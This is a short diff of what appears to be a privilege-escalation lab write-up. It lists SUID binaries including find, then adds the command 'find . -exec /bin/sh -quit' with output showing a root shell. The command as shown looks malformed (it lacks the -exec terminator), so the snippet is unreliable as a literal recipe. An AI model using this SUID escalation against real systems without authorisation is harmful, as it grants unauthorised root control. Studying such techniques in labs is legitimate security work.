@@ -7,3 +7,9 @@ Output
 /usr/bin/su
 /usr/bin/gpasswd
 /usr/bin/find
+Command
+find . -exec /bin/sh -quit
+
+Output
+# whoami
+root
